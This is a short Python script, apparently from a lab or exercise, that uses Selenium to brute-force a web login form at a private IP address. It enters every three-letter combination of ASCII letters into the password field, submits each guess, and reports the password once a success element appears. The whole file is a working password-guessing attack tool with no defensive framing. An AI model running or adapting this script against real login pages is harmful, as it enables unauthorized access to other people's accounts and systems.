import string
from itertools import permutations, combinations, product
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

def convert_to_str(tupple):
    str = ''
    for i in tupple:
        str = str + i
    return str

def site_attack(char_set):
    driver = webdriver.Firefox()
    driver.get("http://10.1.0.118")
    
    for t in product(char_set, repeat=3):
        guess_password = convert_to_str(t)
    
        password1 = driver.find_element("id", "pass") #find id elemen named "pass" on the attacked html code
        password1.send_keys(guess_password) #send the password "yes to this field"

        click1 = driver.find_element("id", "sub") #find id elemen named "sub" on the attacked html code
        click1.click()
        
        display1 = driver.find_element("id", "yes")
        print(display1.is_displayed()) #display the website response for the password sent
        res = display1.is_displayed() 
        if res == True:
            print("the password of the website is", guess_password)
            return guess_password
        password1.clear()


site_attack(list(string.ascii_letters))











